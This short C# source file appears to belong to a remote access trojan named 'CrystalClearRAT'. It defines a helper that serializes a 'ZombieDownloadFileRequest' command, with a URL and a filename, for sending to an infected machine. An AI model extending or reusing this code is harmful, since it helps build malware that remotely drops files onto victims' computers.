using CrystalRATShared.Commands;
using CrystalRATShared.Serialization;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CrystalClearRAT.Functions
{
    class Download
    {

        public static byte[] Request(string link, string filename)
        {
            return CommandDataSerializer.Serialize(CommandFlags.ZombieDownloadFileRequest, (writer) =>
            {
                writer.Write(link);
                writer.Write(filename);
            }
            );
        }

    }
}
